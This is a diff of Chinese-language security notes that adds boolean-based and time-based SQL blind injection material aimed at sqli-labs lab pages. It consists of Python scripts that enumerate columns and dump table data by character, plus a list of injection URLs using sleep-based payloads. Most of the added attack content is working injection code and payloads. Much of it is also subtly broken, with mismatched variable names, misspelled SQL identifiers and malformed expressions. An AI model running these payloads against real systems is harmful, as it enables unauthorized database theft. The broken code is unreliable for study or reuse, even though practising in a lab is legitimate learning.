@@ -1948,13 +1948,11 @@ if __name__ == '__main__':
 </details>
 
 <details>
-<summary>SQL 盲注漏洞</summary>
+<summary>SQL 基于布尔的盲注漏洞</summary>
 
 ```
 ----------------------------------------------------------------------------
 //基于布尔的盲注：当页面没有回响位、不会输出SQL语句报错信息，通过返回页面响应的正常或不正常的情况进行注入
-
-//基于时间的盲注：当页面没有回响位、不会输出SQL语句报错信息、不论SQL语句的执行结果对错都返回一样的页面时，通过页面的响应时间进行注入
 ----------------------------------------------------------------------------
 ｜  库  ｜  表  ｜  字段  ｜  数据  ｜  
 
@@ -2121,8 +2119,128 @@ def GetDBCloums(url, dbname, datable):
     for DBColumnCount in range(99):
         payload = "' and if ((select count(column_name) from information_schema.columns where table_schema='{0} and table_name='{1}')={2},1,0) %23"
         targetUrl = url + payload
+        tes = conn.get(targetUrl.format(dbname, datable, DBColoumnCount))
+        if flag in res.content.decode("utf-8"):
+            print("[-]{0} 数据表的字段数为:{1}".format(dbtable, DBColumnCount))
+            break
 
+    column = ""
+    for a in range(0, BDColumnCount):
+        print("[-]正在获取第{0}个字段名".format(a+1))
+        for columnLen in range(99):
+            payload = "' and if((select length(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1) = {3},1,0} %23"
+            targetUrl = url + payload
+            res = conn.get(targetUrl.format(dbname, dbtable, a, columnLen))
+            if flag in res.content.decode("utf-8"):
+                break
+        for b in range(1, columnLen+1):
+            paylaod = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name'{1}' limit {2},1),{3},1))={4},1,0) %23"
+            targetUrl = url + payload
+            for c in range(33, 127):
+                res = conn.get(targetUrl.format(dbname, dbtable, a, b, c))
+                if flag in res.content.decode("utf-8"):
+                    column += chr(c)
+                    print(column)
+                    break
+        DBColumns.append(column)
+        column = ""
 
+//编写数据获取函数，根据获取第URL、数据表名和数据表字段来获取数据。数据以字典的形式存放，键为字段名，值为字段数据形成的列表：
+def GetDBData(url, dbtable, dbcolumn):
+    global DBData
+    print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
+    for DBDataCount in range(99):
+        payload = "'and if ((select count({0}) from {1})={2},1,0) %23"
+        targetUrl = url + payload
+        res = conn.get(targetUrl.format(dbcolumn, dbtable, DBDataCount))
+        if flag in res.content.decode("utf-8"):
+            print("[-]{0}表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn, DBDataCount))
+            break
+    for a in range(0, DBDataCount):
+        pritnt("[-]正在获取{0}的第{1}个数据".format(docolumn, a+1))
+        dataLen = 0
+        for dataLen in range(99):
+            payload = "'and if ((select length({0}) from {1} limit {2},1)={3},1,0) %23"
+            targetUrl = url + payload
+            res = conn.get(targetUrl.format(dbcolumn, dbtable, a, dataLen))
+            if flag in res.content.decode("utf-8"):
+                print("[-]第{0}个数据长度为:{1}".format(a+1, dataLen))
+                break
+        data = ""
+        for b in range(1, dataLen+1):
+            for c in range(33,127):
+                payload = "'and if (ascii(substr((select {0} from {1} limit {2},1), {3},1)) = {4},1,0) %23"
+                targetUrl = url + payload
+                res = conn.get(targetUrl.format(dbcolumn, dbtable, a, b, c))
+                if flag in res.content.decode("utf-8"):
+                    data += chr(c)
+                    print(data)
+                    break
+        DBData.setdefault(dbcolumn,[]).append(data)
+        print(DBData)
+        data = ""
+
+//编写主函数，用来获取目标的URL并传递给StarTSqli:
+if __name__ == '__main__':
+    parser = optparse.OptionParser('usage: python %prog -u url \n\n' 'Example:python %prog -u http://192.168.61.1/sql/Less-8/?id=1\n')
+    (options, agrs) = parser.parse_args()
+    StartSqli(options.targetUrl)
+
+```
+
+</details>
+
+<details>
+<summary>SQL 基于时间的盲注漏洞</summary>
+
+```
+----------------------------------------------------------------------------
+//基于时间的盲注：当页面没有回响位、不会输出SQL语句报错信息、不论SQL语句的执行结果对错都返回一样的页面时，通过页面的响应时间进行注入
+----------------------------------------------------------------------------
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if(length(database())=8,sleep(5),0) %23 //判断数据库的长度
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0) %23 //获取数据库名
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select count(tabel_name) from information_schema.tables where table_schema='security' limit 0,1)=6,sleep(5),0) %23    //获取数据库中表的数量
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select length(table_name) from information_schema.tables where table_schema='security' limit 0,1)=6,sleep(5),0) %23   //获取数据库表的长度
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schem='security' limit 0,1),1,1))=101,sleep(5),0) %23     //获取数据库表
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select count(coluns_name) from information_schema.columns where table_schema='security' and table_name='users')=3,sleep(5),0) %23     //获取数据库中字段的数量
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select length(column_name) from informatio_schema.columns where table_schema='security' and table_name='users' limit 0,1)=2,sleep(5),0) %23   //获取表字段的长度
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if(ascii(substr((select columm_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))=105,sleep(5),0) %23    //获取数据库字段
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select count(username) fro users)=13,sleep(5),0) %23    //获取字段数据的数量
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if((select length(username) from users limit 0,1)=4,sleep(5),0) %23   //获取字段数量的长度
+>>> http://127.0.0.1/sql/Less-9/?id=1' and if(ascii(substr(select username from users limit 0,1),1,1))=58,sleep(5),0) %23  //  获取数据内容
+```
+
+</details>
+
+<details>
+<summary>获取数据库名的函数_time模块</summary>
+
+```
+def GetDBName(url):
+    global DBName
+    print("[-]开始获取数据库的长度")
+    DBNameLen = 0
+    payload = "' and if(length(database())={0},sleep(5),0) %23"
+    targetUrl = url + payload
+    for DBNameLen in range(1, 99):
+        timeStart = time.time()
+        res = conn.get(targetUrl.format(DBNameLen))
+        timeEnd = time.time()
+        if timeEnd - timeStart >= 5:
+            print("[+] 数据库名的长度:" + str(DBNameLen))
+            break
+    print("[-] 开始获取数据库名")
+    payload = "'and if(ascii(substr(database(),{0},1))={1},sleep(5),0) %23"
+    targetUrl = url + payload
+    for a in range(1, DBNameLen+1):
+        for b in range(1, DBNameLen+1):
+            timeStart = time.time()
+            res = conn.get(targetUrl.format(a,b))
+            timeEnd = time.time()
+            if timeEnd - timeStart >= 5:
+                DBName += chr(b)
+                print("[-]"+ DBName)
+                break
 ```
 
 </details>
